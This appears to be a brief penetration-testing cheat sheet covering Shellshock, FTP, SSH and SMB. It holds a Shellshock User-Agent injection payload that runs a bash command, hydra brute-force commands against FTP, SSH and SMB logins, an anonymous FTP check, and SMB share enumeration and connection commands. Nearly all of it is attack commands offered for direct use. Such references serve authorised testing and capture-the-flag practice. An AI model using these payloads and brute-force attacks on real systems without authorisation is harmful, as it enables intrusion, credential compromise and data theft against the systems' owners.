## Shellshock (CVE-2014-6271)
usually exploit apache with cgi functionalities
```bash
nmap -sV $IP --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
```

injection in user-agent http header.

`() { :; }; echo; echo; /bin/bash -c 'whoami'`

## FTP (File Transfert Protocol) - PORT 21
Try anonymous as username (leave password blank.)
```bash
ftp $IP
```
or

```bash
nmap -sV $IP --script=ftp-anon
```

Brute-force

```bash
hydra -L wordlist.txt -P passwdlist.txt $IP -t 4 ftp
```

## SSH (Secure Shell) - port 22

Brute-force attack for username-password authentication

```bash
hydra -L wordlist.txt -P passwdlist.txt $IP -t 4 ssh
```

## SAMBA - PORT 445 ( Netbios 139)
bruteforce with hydra for initial foothold.
```bash
hydra -L wordlist1 -P wordlist2 $IP smb
```
### enumerating the samba share
```bash
smbmap -H $IP -u admin -p password1
``` 
```bash
smbclient -L $IP -U admin 
```
```bash
enum4linux -a $IP 
```
### connect to share
```bash
smbclient //$IP/shareName -U admin 
```